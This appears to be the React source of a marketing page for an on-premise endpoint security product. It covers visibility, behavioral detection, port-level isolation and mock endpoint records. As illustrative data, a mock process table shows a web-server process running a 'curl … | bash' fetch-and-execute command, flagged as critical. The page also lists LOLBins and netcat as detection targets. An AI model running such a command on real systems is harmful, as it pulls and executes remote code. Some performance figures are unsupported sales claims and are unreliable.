"use client";

import { useState, useMemo } from "react";
import Link from "next/link";
import Navbar from "@/components/Navbar";
import Footer from "@/components/Footer";
import {
  Server,
  Activity,
  Info,
  FolderLock,
  Cpu,
  Package,
  Network,
  ShieldCheck,
  Flame,
  Usb,
  Search,
  Filter,
  CheckCircle2,
  AlertTriangle,
  XCircle,
  SlidersHorizontal,
  HardDrive,
  ShieldAlert,
  FileText,
  Terminal,
  ChevronRight,
  X,
  Laptop,
} from "lucide-react";

interface TabData {
  id: string;
  title: string;
  shortTitle: string;
  description: string;
  bullets: string[];
  metrics: { label: string; value: string; sub: string };
  codeSnippet: string;
}

const ENDPOINT_TABS: TabData[] = [
  {
    id: "visibility",
    title: "Realize continuous endpoint visibility without external cloud pipelines",
    shortTitle: "Continuous Visibility",
    description:
      "JANUS Endpoint Security gives security teams real-time, continuous visibility into every server, workstation, and edge node in your estate — all collected and retained exclusively within your private network. With flat licensing and no cloud telemetry requirements, teams can maintain complete endpoint coverage without per-sensor costs or data sovereignty concerns.",
    bullets: [
      "Continuous real-time monitoring of every server, workstation, and edge node",
      "All endpoint telemetry stored and processed entirely within your private network",
      "No data ever leaves your perimeter — complete sovereignty over endpoint events",
      "Flat, predictable licensing — full coverage without per-endpoint cost penalties",
    ],
    metrics: {
      label: "DATA LEAKAGE RISK",
      value: "0.00%",
      sub: "Strict air-gap compliance • Telemetry never leaves operational perimeter",
    },
    codeSnippet: `// JANUS Endpoint Visibility — Live Collection Status
[Host: PROD-SRV-DB01 | Status: ACTIVE]
  ↳ Real-Time Event Collection: RUNNING
  ↳ Behavioral Baseline: ESTABLISHED
  ↳ Air-Gapped Local Storage: ACTIVE
  ↳ External Data Exposure: 0 bytes
  ✓ Telemetry Custody: 100% On-Premise [Sovereignty Verified]`,
  },
  {
    id: "detection",
    title: "Empower deterministic detection with process and behavioral context",
    shortTitle: "Deterministic Detection",
    description:
      "Unlike traditional endpoint tools that rely on signature feeds or cloud-dependent scoring, JANUS identifies threats through continuous behavioral monitoring of every process, user action, and network activity on the host. Threats are detected and evaluated locally in real time — no cloud queries, no latency, no black-box uncertainty.",
    bullets: [
      "Detection grounded in established industry attack frameworks",
      "Continuous monitoring of process behavior, user actions, and network activity",
      "Identify advanced threats including fileless attacks and credential abuse at runtime",
      "Fully local threat evaluation — no external cloud scoring or query dependencies",
    ],
    metrics: {
      label: "DETECTION ACCURACY",
      value: "99.7%",
      sub: "Deterministic behavioral verification • Zero cloud latency",
    },
    codeSnippet: `// JANUS Behavioral Detection — Live Alert
[ALERT: CRITICAL] Unauthorized Command Execution Detected
  ↳ Affected Host:   PROD-SRV-DB01
  ↳ Process:        Web service attempted to launch an interactive shell
  ↳ Risk Context:   Consistent with active exploitation pattern
  ↳ Detection:      Local behavioral engine [< 12ms evaluation time]
  ✓ Recommended:   Immediate isolation and investigation`,
  },
  {
    id: "convergence",
    title: "Fuel SOC + NOC convergence from process tree to physical switch port",
    shortTitle: "SOC + NOC Convergence",
    description:
      "Unify endpoint security with network infrastructure intelligence in a single view. Because JANUS links endpoint events directly with network inventory and physical port tracking, an endpoint alert instantly becomes an end-to-end incident profile — giving responders full attribution across host activity, network identity, and physical device location.",
    bullets: [
      "Every endpoint alert enriched with full network identity and physical device location",
      "Coordinated containment — freeze malicious processes and isolate the device's network port simultaneously",
      "One-click isolation from the security console with zero manual steps",
      "Eliminate organizational silos between endpoint triage and network operations",
    ],
    metrics: {
      label: "TIME TO ATTRIBUTION",
      value: "< 1.2s",
      sub: "From process anomaly to physical device isolation",
    },
    codeSnippet: `// Converged NOC + SOC — End-to-End Attribution
[Threat Event: Suspicious Process on PROD-SRV-DB01]
  ↳ Host Identity:  PROD-SRV-DB01 (Production Database Tier)
  ↳ Network Loc.:   Production Segment — Port 14
  ↳ Action:         [CONVERGED CONTAINMENT INITIATED]
      1. Suspicious process suspended on host
      2. Network access revoked at hardware level
  ✓ Full Isolation Verified [< 1.4s total elapsed]`,
  },
];


const DEFENSE_PILLARS = [
  {
    title: "Keep 100% of your endpoint data inside your network",
    description:
      "Protect your computers and servers without sending logs or files to external vendor clouds. All monitoring data stays safely inside your private network.",
    highlight: "100% Private Data",
  },
  {
    title: "Spot attacks quickly using proven security rules",
    description:
      "Detect suspicious commands, unauthorized scripts, and abnormal login attempts in real time. JANUS flags real malicious behavior without false alarms.",
    highlight: "Proven Detection",
  },
  {
    title: "Catch unauthorized system changes and security drift",
    description:
      "Continuously check critical system files, background services, and open network ports. JANUS alerts you immediately when settings change or unapproved apps appear.",
    highlight: "System Integrity",
  },
  {
    title: "View the complete attack story in a single timeline",
    description:
      "See how an incident started, which files were touched, and where it tried to connect. Your team gets a clear, connected timeline without piecing together separate logs.",
    highlight: "Clear Attack Timeline",
  },
  {
    title: "Inspect running processes and open ports instantly",
    description:
      "Give your team direct visibility into active apps, user logins, and open connections. Analysts can verify and resolve issues in seconds without slowing down user devices.",
    highlight: "Fast Inspection",
  },
  {
    title: "Isolate compromised devices automatically at the switch",
    description:
      "When a serious threat is confirmed, JANUS takes action instantly. It cuts off the device's network access at the physical switch port, stopping the attack from spreading.",
    highlight: "Instant Containment",
  },
];

const COMPARISON_ROWS = [
  {
    criterion: "Telemetry Residency & Sovereign Air-Gap",
    sub: "Data leakage & sovereign operational boundary",
    janusPrimary: "100% On-Premise Local Custody",
    janusSecondary: "Zero phone-home calls. Sensitive process arguments and command logs stay within your private network.",
    legacyPrimary: "Mandatory Multi-Tenant Cloud Egress",
    legacySecondary: "Continuous streaming of host telemetry, command arguments, and files to third-party vendor clouds.",
  },
  {
    criterion: "Detection Architecture & Offline Autonomy",
    sub: "Operational responsiveness during network segmentation",
    janusPrimary: "Deterministic Local Heuristics",
    janusSecondary: "Sub-second OS-level audit rules execute locally. Full protection persists even during air-gap isolation.",
    legacyPrimary: "Cloud-Query Dependency",
    legacySecondary: "Detection relies on cloud API roundtrips; degraded protection and blind spots during WAN link outages.",
  },
  {
    criterion: "NOC + SOC Hardware Attribution",
    sub: "Bridging host events to physical infrastructure",
    janusPrimary: "Instant Switch Port & IPAM Binding",
    janusSecondary: "Correlates malicious PIDs directly to physical MAC address, DHCP lease, and switch port (Gi1/0/14).",
    legacyPrimary: "Disconnected Host Silo",
    legacySecondary: "Zero physical network awareness; requires manual coordination tickets with separate network engineering teams.",
  },
  {
    criterion: "Containment Velocity & Port Control",
    sub: "Lateral movement neutralization at machine speed",
    janusPrimary: "Converged Host + Port Quarantine (< 1.4s)",
    janusSecondary: "Freezes compromised processes while simultaneously shutting switch ports or steering VLANs via RADIUS/SNMP.",
    legacyPrimary: "Software Agent-Only Isolation",
    legacySecondary: "Relies solely on endpoint software driver; completely bypassed if rootkit unhooks or terminates the agent.",
  },
  {
    criterion: "Agent Resource Footprint",
    sub: "Host compute stability on production servers",
    janusPrimary: "Ultralight Audit Framework (< 1.2% CPU)",
    janusSecondary: "Minimal memory footprint (35-45MB). Zero heavy local AI model inference slowing down server workloads.",
    legacyPrimary: "Heavy CPU Spikes & Memory Bloat",
    legacySecondary: "High CPU consumption and recurring background scans causing performance degradation on mission-critical servers.",
  },
  {
    criterion: "Licensing & Economic Scalability",
    sub: "Cost predictability without per-endpoint penalties",
    janusPrimary: "Flat Predictable Licensing",
    janusSecondary: "Zero per-sensor taxes or recurring endpoint penalties. Scale servers, workstations, and IoT freely.",
    legacyPrimary: "Per-Endpoint Subscription Tax",
    legacySecondary: "Steep recurring price tiers per sensor, with penalizing data ingestion caps and extended retention surcharges.",
  },
];

interface EndpointCapability {
  id: string;
  number: string;
  title: string;
  shortDesc: string;
  badge: string;
  category: string;
  description: string;
  bullets: string[];
  metricLabel: string;
  metricValue: string;
  iconName: string;
}

const ENDPOINT_ACTIVITY_CAPABILITIES: EndpointCapability[] = [
  {
    id: "endpoint-inventory",
    number: "01",
    title: "Endpoint Inventory",
    shortDesc: "Maintain a centralized list of registered Windows and Linux endpoints.",
    badge: "FLEET REGISTRY",
    category: "Inventory & Identity",
    description: "Maintain a centralized, real-time registry of all registered Windows and Linux endpoints across your enterprise infrastructure.",
    bullets: [
      "Unified inventory of physical workstations, bare-metal servers, and edge nodes",
      "Native support for Windows (10, 11, Server 2016-2022) and Linux (Ubuntu, RHEL, Debian, CentOS)",
      "Continuous asset reconciliation against DHCP leases, static pools, and switch MAC tables",
      "Dynamic tagging by business unit, compliance zone, or physical security perimeter",
    ],
    metricLabel: "FLEET COVERAGE",
    metricValue: "100% On-Prem",
    iconName: "Server",
  },
  {
    id: "endpoint-status",
    number: "02",
    title: "Endpoint Status Monitoring",
    shortDesc: "Track whether endpoint agents are currently connected and reporting telemetry.",
    badge: "HEARTBEAT TELEMETRY",
    category: "Telemetry & Health",
    description: "Track whether endpoint agents are currently connected, healthy, and actively streaming local host telemetry without cloud brokers.",
    bullets: [
      "Sub-second agent liveness probes across encrypted internal transport channels",
      "Immediate alerting on agent disconnections, silent dropouts, or communication anomalies",
      "Local agent buffer health diagnostics and ingestion bandwidth metrics",
      "Autonomous reconnection with zero telemetry loss during transient network partitions",
    ],
    metricLabel: "LIVENESS PROBE",
    metricValue: "< 1.5s Interval",
    iconName: "Activity",
  },
  {
    id: "system-information",
    number: "03",
    title: "System Information",
    shortDesc: "Display hostname, IP address, operating system, and kernel/version information.",
    badge: "HOST METADATA",
    category: "Inventory & Identity",
    description: "Display hostname, IP address, MAC attribution, operating system distribution, build numbers, and kernel release details at a glance.",
    bullets: [
      "Granular OS identification (e.g. Windows 11 23H2 / Ubuntu 22.04 LTS / RHEL 9.3)",
      "Exact kernel build reporting (Linux 5.15 / 6.1, Windows NT 10.0.22631)",
      "Full network identity binding: Primary IPv4/IPv6, subnet mask, gateway, and MAC",
      "Hardware-level switch port (Gi1/0/14) and VLAN tag association",
    ],
    metricLabel: "ATTRIBUTION DEPTH",
    metricValue: "OS to Switch Port",
    iconName: "Info",
  },
  {
    id: "folder-monitoring",
    number: "04",
    title: "Folder Monitoring",
    shortDesc: "Monitor Folder with confidential data for unauthorized access or modification.",
    badge: "CONFIDENTIAL FIM",
    category: "Data & Integrity",
    description: "Monitor designated folders and storage shares containing confidential or sensitive business data for unauthorized access, changes, or exfiltration.",
    bullets: [
      "Real-time File Integrity Monitoring (FIM) on high-value confidential directories",
      "Instant alerts on unauthorized read, write, rename, deletion, or permission alterations",
      "Cryptographic SHA-256 hash validation before and after file access events",
      "Audit trail linking accessing process PID, user account, and destination network socket",
    ],
    metricLabel: "TAMPER DETECTION",
    metricValue: "Real-Time / 0 Latency",
    iconName: "FolderLock",
  },
  {
    id: "process-monitoring",
    number: "05",
    title: "Process Monitoring",
    shortDesc: "Track the number of active processes running on each endpoint.",
    badge: "PROCESS TREE",
    category: "Execution & Runtime",
    metricLabel: "EXECUTION AUDIT",
    metricValue: "Full Tree Lineage",
    description: "Track the number of active processes running on each endpoint, evaluate parent-child execution lineages, and detect anomalous binaries.",
    bullets: [
      "Continuous live process counter tracking active execution loads on every host",
      "Deterministic LOLBin detection (PowerShell, Bash, rundll32, certutil, wscript)",
      "High CPU/memory anomaly alerting to identify hidden miners or rogue background scripts",
      "One-click process suspension (SIGSTOP) or termination (SIGKILL) directly from console",
    ],
    iconName: "Cpu",
  },
  {
    id: "application-inventory",
    number: "06",
    title: "Application Inventory",
    shortDesc: "Monitor installed applications and software packages.",
    badge: "SOFTWARE CATALOG",
    category: "Software & Compliance",
    metricLabel: "INVENTORY AUDIT",
    metricValue: "Multi-Format Packages",
    description: "Catalog and monitor all installed applications, system packages, software versions, and unapproved shadow IT across endpoints.",
    bullets: [
      "Exhaustive inventory of native packages (.deb, .rpm, MSI, Windows Programs, pip/npm)",
      "Version tracking correlated with on-prem vulnerability feeds for instant CVE discovery",
      "Instant flagging of unapproved, outdated, or blacklisted application installations",
      "Continuous delta auditing highlighting newly installed or silently modified software",
    ],
    iconName: "Package",
  },
  {
    id: "network-monitoring",
    number: "07",
    title: "Network Monitoring",
    shortDesc: "Identify network ports and services reported by each endpoint.",
    badge: "SOCKET & PORT",
    category: "Network & Traffic",
    metricLabel: "PORT VISIBILITY",
    metricValue: "TCP / UDP Sockets",
    description: "Identify listening network ports, bound services, active sockets, and inbound/outbound communication flows reported by each endpoint.",
    bullets: [
      "Real-time listing of all open TCP/UDP listening sockets and the exact owning binary/PID",
      "Continuous monitoring of active outbound sessions to lateral internal or external IPs",
      "Instant notification when unauthorized listening services (e.g. rogue SSH, RDP, netcat) appear",
      "Live interface throughput, packet transfer rates, and abnormal socket volume analytics",
    ],
    iconName: "Network",
  },
  {
    id: "antivirus-monitoring",
    number: "08",
    title: "Antivirus Monitoring",
    shortDesc: "Detect whether antivirus protection is enabled or disabled.",
    badge: "AV STATE GUARD",
    category: "Host Protection",
    metricLabel: "STATE INTEGRITY",
    metricValue: "Active / Disabled",
    description: "Detect whether antivirus protection is enabled or disabled, verify definition update status, and flag endpoints with inactive AV shields.",
    bullets: [
      "Real-time status auditing for Windows Defender, ClamAV, and enterprise AV engines",
      "Immediate high-priority security alarm whenever real-time protection is disabled",
      "Signature definition freshness validation to eliminate outdated database blind spots",
      "Consolidated quarantine log ingestion and threat resolution tracking",
    ],
    iconName: "ShieldCheck",
  },
  {
    id: "firewall-monitoring",
    number: "09",
    title: "Firewall Monitoring",
    shortDesc: "Monitor the host firewall state and identify endpoints where firewall protection is inactive.",
    badge: "FIREWALL INTEGRITY",
    category: "Host Protection",
    metricLabel: "PROFILE AUDIT",
    metricValue: "Domain · Private · Public",
    description: "Monitor the host firewall state across all profiles and immediately identify endpoints where host firewall protection is inactive or disabled.",
    bullets: [
      "Continuous status tracking across Windows Firewall, iptables, nftables, and ufw",
      "Instant detection when host firewall service is stopped, disabled, or flushed",
      "Audit of active inbound/outbound rule sets to detect dangerous wildcard allow rules",
      "Autonomous remediation options to force re-enabling of compliant host firewall policies",
    ],
    iconName: "Flame",
  },
  {
    id: "usb-monitoring",
    number: "10",
    title: "USB Monitoring",
    shortDesc: "Track USB devices associated with endpoints.",
    badge: "PERIPHERAL DEFENSE",
    category: "Hardware & Peripherals",
    metricLabel: "HARDWARE AUDIT",
    metricValue: "VID / PID / Serial",
    description: "Track all USB storage devices and peripheral hardware connected to endpoints, capturing device serial numbers and enforcing access policies.",
    bullets: [
      "Real-time detection and logging whenever a USB storage device or peripheral is plugged in",
      "Capture of USB Vendor ID (VID), Product ID (PID), manufacturer string, and serial number",
      "Granular policy enforcement: read-only mounting, full storage block, or audit logging",
      "Forensic timeline linking USB insertion events directly with confidential file access",
    ],
    iconName: "Usb",
  },
  {
    id: "endpoint-filtering",
    number: "11",
    title: "Endpoint Filtering",
    shortDesc: "Search and filter endpoints to quickly locate specific devices.",
    badge: "FLEET SEARCH",
    category: "Operations & Triage",
    metricLabel: "QUERY SPEED",
    metricValue: "< 10ms Search",
    description: "Search and filter endpoints across multiple attributes to quickly locate specific devices, investigate alerts, and execute fleet-wide actions.",
    bullets: [
      "Instant full-text query across hostnames, IPs, MAC addresses, users, and installed software",
      "Multi-facet filters: OS type, agent connection state, AV status, firewall alert, USB state",
      "One-click saved filter views for critical triage (e.g., 'Firewall Inactive' or 'FIM Alerts')",
      "Batch action targeting: apply containment, trigger scans, or export audit logs across filtered hosts",
    ],
    iconName: "Search",
  },
];

interface MockEndpoint {
  id: string;
  hostname: string;
  ip: string;
  os: "Windows" | "Linux";
  osDetails: string;
  kernel: string;
  mac: string;
  switchPort: string;
  status: "Connected" | "Degraded" | "Offline";
  heartbeat: string;
  confidentialFolder: {
    name: string;
    status: string;
    hasAlert: boolean;
  };
  activeProcesses: number;
  installedApps: number;
  listeningPorts: number[];
  antivirus: {
    enabled: boolean;
    name: string;
    status: string;
  };
  firewall: {
    active: boolean;
    profile: string;
  };
  usbDevice: {
    name: string;
    status: "Allowed" | "Blocked" | "Audited" | "None";
  };
}

const MOCK_ENDPOINTS: MockEndpoint[] = [
  {
    id: "ep-01",
    hostname: "PROD-SRV-DB01",
    ip: "10.10.4.12",
    os: "Linux",
    osDetails: "Ubuntu 22.04 LTS",
    kernel: "Linux 5.15.0-101-generic",
    mac: "e4:5f:01:aa:22:90",
    switchPort: "CORE-SW-01:Gi1/0/14",
    status: "Connected",
    heartbeat: "0.8s ago",
    confidentialFolder: {
      name: "/data/classified_db",
      status: "Secured",
      hasAlert: false,
    },
    activeProcesses: 142,
    installedApps: 418,
    listeningPorts: [22, 5432, 9100],
    antivirus: {
      enabled: true,
      name: "ClamAV Enterprise",
      status: "Signatures Current",
    },
    firewall: {
      active: true,
      profile: "iptables / Strict Drop",
    },
    usbDevice: {
      name: "None Attached",
      status: "None",
    },
  },
  {
    id: "ep-02",
    hostname: "ENG-WKSTN-04",
    ip: "10.10.8.44",
    os: "Windows",
    osDetails: "Windows 11 Pro 23H2",
    kernel: "NT 10.0.22631",
    mac: "3c:22:fb:88:14:e2",
    switchPort: "DIST-SW-02:Gi1/0/8",
    status: "Connected",
    heartbeat: "1.1s ago",
    confidentialFolder: {
      name: "D:\\Proprietary_CAD_Source",
      status: "Audited (FIM Live)",
      hasAlert: false,
    },
    activeProcesses: 218,
    installedApps: 86,
    listeningPorts: [135, 445],
    antivirus: {
      enabled: true,
      name: "Microsoft Defender",
      status: "Up to Date",
    },
    firewall: {
      active: true,
      profile: "Domain & Private Active",
    },
    usbDevice: {
      name: "YubiKey 5 NFC (HID)",
      status: "Allowed",
    },
  },
  {
    id: "ep-03",
    hostname: "FIN-HOST-09",
    ip: "10.10.12.89",
    os: "Windows",
    osDetails: "Windows 10 Enterprise",
    kernel: "NT 10.0.19045",
    mac: "70:85:c2:d3:44:a1",
    switchPort: "EDGE-SW-03:Gi1/0/22",
    status: "Connected",
    heartbeat: "1.4s ago",
    confidentialFolder: {
      name: "C:\\Confidential_Ledger_2026",
      status: "Tamper Warning",
      hasAlert: true,
    },
    activeProcesses: 176,
    installedApps: 72,
    listeningPorts: [139, 445, 3389],
    antivirus: {
      enabled: false,
      name: "Defender Disabled",
      status: "CRITICAL: AV INACTIVE",
    },
    firewall: {
      active: false,
      profile: "INACTIVE (Service Stopped)",
    },
    usbDevice: {
      name: "SanDisk Ultra 64GB",
      status: "Blocked",
    },
  },
  {
    id: "ep-04",
    hostname: "SCADA-GW-02",
    ip: "10.10.2.5",
    os: "Linux",
    osDetails: "RHEL 9.3 Hardened",
    kernel: "Linux 5.14.0-362.el9",
    mac: "00:1a:2b:3c:4d:5e",
    switchPort: "ICS-SW-01:Gi1/0/2",
    status: "Connected",
    heartbeat: "0.5s ago",
    confidentialFolder: {
      name: "/opt/scada/crypto_keys",
      status: "Secured",
      hasAlert: false,
    },
    activeProcesses: 68,
    installedApps: 184,
    listeningPorts: [22, 502, 4840],
    antivirus: {
      enabled: true,
      name: "Sovereign eBPF Watch",
      status: "Signatures Current",
    },
    firewall: {
      active: true,
      profile: "firewalld (Industrial Enclave)",
    },
    usbDevice: {
      name: "None Attached",
      status: "None",
    },
  },
  {
    id: "ep-05",
    hostname: "EXEC-LAPTOP-01",
    ip: "10.10.18.15",
    os: "Windows",
    osDetails: "Windows 11 Enterprise",
    kernel: "NT 10.0.22631",
    mac: "48:2a:e3:55:12:bc",
    switchPort: "WIRELESS-AP-04 (VLAN 40)",
    status: "Connected",
    heartbeat: "2.1s ago",
    confidentialFolder: {
      name: "C:\\Board_Minutes_Vault",
      status: "Audited (FIM Live)",
      hasAlert: false,
    },
    activeProcesses: 194,
    installedApps: 94,
    listeningPorts: [445],
    antivirus: {
      enabled: true,
      name: "Microsoft Defender",
      status: "Up to Date",
    },
    firewall: {
      active: true,
      profile: "Public Profile Active",
    },
    usbDevice: {
      name: "Kingston DataTraveler",
      status: "Audited",
    },
  },
  {
    id: "ep-06",
    hostname: "EDGE-NODE-07",
    ip: "10.10.30.71",
    os: "Linux",
    osDetails: "Debian 12 Bookworm",
    kernel: "Linux 6.1.0-18-amd64",
    mac: "b8:27:eb:99:41:c0",
    switchPort: "IOT-SW-01:Gi1/0/18",
    status: "Degraded",
    heartbeat: "4.8s ago",
    confidentialFolder: {
      name: "/etc/pki/tls/private",
      status: "Secured",
      hasAlert: false,
    },
    activeProcesses: 312,
    installedApps: 290,
    listeningPorts: [22, 8080],
    antivirus: {
      enabled: true,
      name: "ClamAV Daemon",
      status: "Warning: Definitions Stale",
    },
    firewall: {
      active: true,
      profile: "ufw (Strict Policy)",
    },
    usbDevice: {
      name: "None Attached",
      status: "None",
    },
  },
];

const ACTIVITY_CATEGORIES = [
  "all",
  "Inventory & Identity",
  "Telemetry & Health",
  "Data & Integrity",
  "Execution & Runtime",
  "Software & Compliance",
  "Network & Traffic",
  "Host Protection",
  "Hardware & Peripherals",
  "Operations & Triage",
];

export default function EndpointSecurityPage() {
  const [activeTab, setActiveTab] = useState<string>("visibility");
  const [activitySearchQuery, setActivitySearchQuery] = useState<string>("");
  const [activityCategoryFilter, setActivityCategoryFilter] = useState<string>("all");
  const [endpointFilterPreset, setEndpointFilterPreset] = useState<string>("all");
  const [selectedEndpoint, setSelectedEndpoint] = useState<MockEndpoint | null>(null);

  const currentTab = ENDPOINT_TABS.find((t) => t.id === activeTab) || ENDPOINT_TABS[0];

  const filteredEndpoints = useMemo(() => {
    return MOCK_ENDPOINTS.filter((ep) => {
      if (endpointFilterPreset === "windows" && ep.os !== "Windows") return false;
      if (endpointFilterPreset === "linux" && ep.os !== "Linux") return false;
      if (endpointFilterPreset === "alerts" && ep.antivirus.enabled && ep.firewall.active && !ep.confidentialFolder.hasAlert) return false;
      if (endpointFilterPreset === "confidential" && !ep.confidentialFolder.name) return false;
      if (endpointFilterPreset === "usb" && ep.usbDevice.status === "None") return false;

      if (activitySearchQuery.trim()) {
        const query = activitySearchQuery.toLowerCase();
        const matchesHostname = ep.hostname.toLowerCase().includes(query);
        const matchesIp = ep.ip.toLowerCase().includes(query);
        const matchesOs = ep.osDetails.toLowerCase().includes(query);
        const matchesFolder = ep.confidentialFolder.name.toLowerCase().includes(query);
        const matchesUsb = ep.usbDevice.name.toLowerCase().includes(query);
        const matchesAv = ep.antivirus.name.toLowerCase().includes(query);
        return matchesHostname || matchesIp || matchesOs || matchesFolder || matchesUsb || matchesAv;
      }

      return true;
    });
  }, [endpointFilterPreset, activitySearchQuery]);

  const filteredCapabilities = useMemo(() => {
    return ENDPOINT_ACTIVITY_CAPABILITIES.filter((cap) => {
      if (activityCategoryFilter !== "all" && cap.category !== activityCategoryFilter) {
        return false;
      }
      return true;
    });
  }, [activityCategoryFilter]);

  const renderCapabilityIcon = (iconName: string) => {
    switch (iconName) {
      case "Server":
        return <Server className="w-5 h-5 text-purple-300" />;
      case "Activity":
        return <Activity className="w-5 h-5 text-emerald-300" />;
      case "Info":
        return <Info className="w-5 h-5 text-blue-300" />;
      case "FolderLock":
        return <FolderLock className="w-5 h-5 text-purple-300" />;
      case "Cpu":
        return <Cpu className="w-5 h-5 text-amber-300" />;
      case "Package":
        return <Package className="w-5 h-5 text-cyan-300" />;
      case "Network":
        return <Network className="w-5 h-5 text-indigo-300" />;
      case "ShieldCheck":
        return <ShieldCheck className="w-5 h-5 text-emerald-300" />;
      case "Flame":
        return <Flame className="w-5 h-5 text-orange-300" />;
      case "Usb":
        return <Usb className="w-5 h-5 text-purple-300" />;
      case "Search":
        return <Search className="w-5 h-5 text-blue-300" />;
      default:
        return <ShieldCheck className="w-5 h-5 text-purple-300" />;
    }
  };

  return (
    <div className="relative w-full min-h-screen text-white flex flex-col items-center overflow-x-clip bg-janus-bg">
      {/* Main Sticky Navbar */}
      <Navbar />

      {/* Hero Section */}
      <section
        id="overview"
        className="relative w-full min-h-screen bg-theme-gradient text-white pt-24 sm:pt-28 pb-10 sm:pb-14 px-6 sm:px-12 lg:px-16 overflow-hidden border-b border-white/10 flex flex-col justify-center"
      >
        {/* Ambient Purple Glows */}
        <div className="absolute top-10 left-1/4 w-96 h-96 bg-purple-600/20 rounded-full blur-3xl pointer-events-none" />
        <div className="absolute top-20 right-1/4 w-[36rem] h-[36rem] bg-indigo-600/15 rounded-full blur-3xl pointer-events-none" />
        <div className="absolute top-0 right-0 w-[45rem] h-[35rem] bg-[radial-gradient(ellipse_at_top_right,rgba(168,85,247,0.18),transparent_70%)] pointer-events-none" />

        <div className="max-w-7xl mx-auto w-full grid grid-cols-1 lg:grid-cols-12 gap-10 lg:gap-14 items-center relative z-10 my-auto">
          {/* Left Column: Heading, Subtitle & Action Cards */}
          <div className="lg:col-span-6 flex flex-col items-start text-left">
            {/* Huge Bold Title */}
            <h1 className="text-4xl sm:text-5xl lg:text-6xl font-bold tracking-tight text-white leading-[1.05] mb-5">
              On-Prem{" "}
              <span className="bg-gradient-to-r from-purple-200 via-purple-300 to-indigo-200 bg-clip-text text-transparent">
                Endpoint
              </span>{" "}
              Truth,<br />
              Zero Cloud Tax
            </h1>

            {/* Sub-headline */}
            <p className="text-base sm:text-lg text-white/70 font-light leading-relaxed max-w-xl mb-8">
              Real-time host monitoring, behavioral tracking, and local attack surface reduction with zero phone-home pipelines and zero recurring per-sensor tax.
            </p>

            {/* Two Standardized CTA Action Cards */}
            <div className="flex flex-col sm:flex-row gap-4 w-full max-w-lg">
              {/* Purple Filled Button */}
              <a
                href="#endpoint-activity"
                className="bg-purple-600 hover:bg-purple-500 text-white p-4 sm:p-5 rounded-2xl shadow-[0_0_30px_rgba(168,85,247,0.4)] border border-purple-400/40 transition-all duration-300 hover:scale-[1.02] active:scale-95 text-left flex-1 group cursor-pointer"
              >
                <div className="font-semibold text-base sm:text-lg flex items-center justify-between text-white">
                  <span>Endpoint Activity Suite</span>
                  <span className="text-xl leading-none transition-transform duration-200 group-hover:translate-x-1">›</span>
                </div>
                <div className="text-xs sm:text-sm text-purple-100/85 font-light mt-1">
                  Explore all 11 live host monitoring modules.
                </div>
              </a>

              {/* Purple Outlined Glass Button */}
              <a
                href="#poc"
                className="bg-white/5 hover:bg-white/10 text-purple-200 border-2 border-purple-500/50 p-4 sm:p-5 rounded-2xl shadow-[0_0_20px_rgba(168,85,247,0.15)] transition-all duration-300 hover:scale-[1.02] active:scale-95 text-left flex-1 group cursor-pointer"
              >
                <div className="font-semibold text-base sm:text-lg flex items-center justify-between text-purple-200 group-hover:text-white">
                  <span>View product brief</span>
                  <span className="text-xl leading-none transition-transform duration-200 group-hover:translate-x-1">›</span>
                </div>
                <div className="text-xs sm:text-sm text-purple-300/75 font-light mt-1">
                  Discover key features and benefits.
                </div>
              </a>
            </div>
          </div>

          {/* Right Column: 3 Overlapping Software Mockup Windows */}
          <div className="lg:col-span-6 relative w-full h-[440px] sm:h-[480px] flex items-center justify-center">
            {/* 1. Background Window: Host Inventory & Process Execution Table */}
            <div className="absolute right-0 top-4 sm:top-6 w-[88%] sm:w-[85%] h-[370px] sm:h-[400px] bg-[#140b1a]/95 rounded-2xl border border-purple-500/25 shadow-[0_25px_60px_rgba(0,0,0,0.8)] overflow-hidden flex flex-col text-white font-sans text-xs backdrop-blur-md">
              {/* Window Header */}
              <div className="px-4 py-3 bg-[#190e22] border-b border-white/10 flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <span className="w-2.5 h-2.5 rounded-full bg-purple-400" />
                  <span className="font-mono text-[11px] text-white/60">
                    Host: PROD-SRV-DB01 · Kernel 5.15.0 · eBPF/Audit Active
                  </span>
                </div>
                <div className="flex items-center gap-1.5">
                  <span className="w-2 h-2 rounded-full bg-white/30" />
                  <span className="w-2 h-2 rounded-full bg-white/30" />
                </div>
              </div>

              {/* Table & Host Context Drawer */}
              <div className="flex-1 flex overflow-hidden">
                {/* Process Execution List */}
                <div className="flex-1 p-3.5 space-y-2 font-mono text-[10px] text-white/60 overflow-hidden">
                  <div className="grid grid-cols-12 pb-1.5 border-b border-white/10 text-[9px] uppercase tracking-wider text-white/40">
                    <span className="col-span-2">PID</span>
                    <span className="col-span-5">Binary / Command</span>
                    <span className="col-span-3">User / Priv</span>
                    <span className="col-span-2 text-right">Status</span>
                  </div>

                  {[
                    { pid: "1", cmd: "/sbin/init", usr: "root (0)", s: "Normal", sc: "text-white/60" },
                    { pid: "884", cmd: "/usr/sbin/nginx -g daemon", usr: "www-data (33)", s: "Audited", sc: "text-emerald-400" },
                    { pid: "1042", cmd: "/usr/sbin/sshd -D", usr: "root (0)", s: "Audited", sc: "text-blue-400" },
                    { pid: "1055", cmd: "curl -sSL http://10.10.4.99/p | bash", usr: "www-data (33)", s: "CRITICAL", sc: "text-red-400" },
                    { pid: "1280", cmd: "/usr/bin/postgres -D /data", usr: "postgres (108)", s: "Normal", sc: "text-white/60" },
                  ].map((row, i) => (
                    <div key={i} className="grid grid-cols-12 py-1 items-center border-b border-white/5">
                      <span className="col-span-2 text-purple-300 font-semibold">{row.pid}</span>
                      <span className="col-span-5 truncate text-white/80">{row.cmd}</span>
                      <span className="col-span-3 text-white/50">{row.usr}</span>
                      <span className={`col-span-2 text-right font-semibold ${row.sc}`}>{row.s}</span>
                    </div>
                  ))}
                </div>

                {/* Right Host Attribution Drawer */}
                <div className="w-36 bg-[#100715] border-l border-white/10 p-3 flex flex-col justify-between font-mono text-[9px] text-white/60">
                  <div className="space-y-2">
                    <div className="text-purple-400 uppercase font-semibold text-[8px] tracking-wider">Host Attribution</div>
                    <div>IP: <span className="text-white">10.10.4.12</span></div>
                    <div>MAC: <span className="text-purple-300">e4:5f:01:aa</span></div>
                    <div>Port: <span className="text-emerald-400">CORE-SW-01:Gi1/0/14</span></div>
                    <div>VLAN: <span className="text-white">10 (PROD_SRV)</span></div>
                    <div>Cloud Egress: <span className="text-emerald-400 font-bold">0 B/s [Strict]</span></div>
                  </div>
                  <div className="pt-2 border-t border-white/10">
